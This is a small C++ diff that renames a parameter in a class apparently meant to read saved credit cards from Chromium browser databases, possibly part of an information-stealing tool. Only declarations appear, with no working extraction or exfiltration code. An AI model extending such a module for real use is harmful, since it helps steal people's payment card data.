@@ -19,7 +19,7 @@ struct CreditCard {
 
 class CCreditCards : public ChromiumBrowserModule {
 public:
-    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
+    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
 private:
     std::list<CreditCard> getCreditCards(const fs::path &db_path);
 };
